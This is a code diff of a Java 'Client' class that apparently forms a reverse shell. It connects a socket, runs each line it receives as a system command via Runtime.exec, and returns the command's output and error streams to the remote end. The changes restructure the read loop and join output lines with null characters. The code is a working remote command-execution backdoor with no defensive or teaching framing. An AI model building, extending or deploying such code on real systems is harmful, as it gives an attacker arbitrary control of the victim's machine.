@@ -13,24 +13,32 @@ public class Client {
 
             socket.connect(inetSocketAddress);
             PrintStream ps = new PrintStream(socket.getOutputStream());
-            Scanner scanner = new Scanner(new InputStreamReader(socket.getInputStream()));
 
             for (;;) {
-                Process runtime = Runtime.getRuntime().exec(scanner.nextLine());
+                Scanner scanner = new Scanner(new InputStreamReader(socket.getInputStream()));
+                String command = scanner.nextLine();
+
+                System.out.println(command);
+                Process runtime = Runtime.getRuntime().exec(command);
 
                 BufferedReader inputManager = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
                 BufferedReader customManager = new BufferedReader(new InputStreamReader(runtime.getErrorStream()));
 
-                String str;
-                while ((str = inputManager.readLine()) != null) {
+                String str = "", temp;
+
+                while ((temp = inputManager.readLine()) != null) str += temp + '\0';
+                if (!str.isEmpty()) {
                     ps.println(str);
                     ps.flush();
+
+                    continue;
                 }
 
-                while ((str = customManager.readLine()) != null) {
-                    ps.println(str);
-                    ps.flush();
-                }
+                while ((temp = customManager.readLine()) != null) str += temp + '\0';
+
+                ps.println(str);
+                ps.flush();
+
             }
         } catch (IOException e) {
             e.printStackTrace();
